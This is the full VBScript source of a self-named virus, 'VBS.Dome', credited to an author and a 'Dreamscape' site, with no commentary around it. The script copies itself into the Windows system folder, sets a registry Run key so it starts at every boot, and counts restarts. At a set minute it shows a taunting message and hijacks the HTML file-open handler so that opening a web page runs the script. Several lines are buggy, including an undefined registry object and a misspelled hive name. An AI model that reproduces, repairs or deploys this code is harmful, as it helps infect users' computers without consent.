On Error Resume Next

Set ds2k = CreateObject("Scripting.FileSystemObject")
Set dmsr = CreateObject("WScript.Shell")
Const SystemFolder = 1, ForReading = 1, ForWriting = 2, ForAppending = 8

Dim dmsp, dmsr, dmsd, dmsm, dmsf, dmsc, dmsl
dmsp = WScript.ScriptFullName
Set dmsd = ds2k.GetSpecialFolder(SystemFolder)
dmsf = dmsd & "\VBS.Dome.vbs"
If (ds2k.FileExists(dmsf)) Then
	Set dmsc = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dome")
	If Not dmsc = dmsf Then
	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dome", dmsf
	End If

Else

	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Runs", "1"
	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Notifies", "0"
	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Dome", dmsf
	Set ReadMe = ds2k.OpenTextFile(dmsp, ForReading)
	dmsr = ReadMe.ReadAll
	ReadMe.Close
	Set dmsm = ds2k.CreateTextFile(dmsf, True)
	dmsm.Write dmsr
	dmsm.Close
End If

Mins = Minute(Now)

If Mins = "39" Then
	dmsl = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Runs")
	Notifies = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Notifies")
	MsgBox "Tick Tick... " & (Chr(13) & Chr(10)) & "I Have Sat On Your System For " & dmsl & " Restarts Before Making Myself Known To You. I Have Notified You " & Notifies & "Time(s) Before" & (Chr(13) & Chr(10)) & (Chr(13) & Chr(10)) & "VBS.Dome" & (Chr(13) & Chr(10)) & "Coded by Dome" & (Chr(13) & Chr(10)) & "Dreamscape" & (Chr(13) & Chr(10)) & "http://www.dreamscape2k.net", 4096, "VBS.Dome"
	dmsr.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\(Default)", "c:\windows\system\Dome.vbs"
	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Runs", "0"
	dmsr.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Notifies", "Notifies" 
Else
	dmsl = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Dome\Runs") 
	dmsl = dmsl + 1
	dmsr.RegWrite "HKEY_LOCAL_MACHICE\Software\Microsoft\Windows\CurrentVersion\Dome\Runs", dmsl 
End If